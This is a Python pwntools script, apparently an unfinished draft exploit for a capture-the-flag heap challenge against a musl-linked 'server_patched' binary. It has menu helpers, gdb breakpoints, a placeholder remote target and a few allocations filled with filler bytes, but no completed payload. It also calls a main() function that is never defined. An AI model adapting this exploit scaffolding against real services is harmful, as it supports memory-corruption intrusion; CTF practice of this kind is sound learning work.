#!/usr/bin/env python3

from pwn import *

exe = ELF("./server_patched")
libc = ELF("./libc.musl-x86_64.so.1")

context.binary = exe

gdbscript = '''
b *allocate+103
b *unallocate+136
'''.format(**locals())


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote("addr", 1337)

    return r


io = conn()

def alloc(size):
    io.sendline(b'1')
#    io.sendlineafter('Size: ', str(size))
    io.send(str(size))

def show(idx):
    io.sendline(b'3')
    io.sendafter('Bucket: ', str(idx))

def free(idx):
    io.sendline(b'4')
    io.sendlineafter('Bucket: ', str(idx))

def edit(idx, size, data):
    io.sendline(b'2')
    io.send(str(idx))
    io.send(str(size))
    io.send(data)

for _ in range(4):
    alloc(0x20)

for i in range(4):
    edit(i, 0x20, b'AAAAAAAABBBBBBB')

io.interactive()


if __name__ == "__main__":
    main()
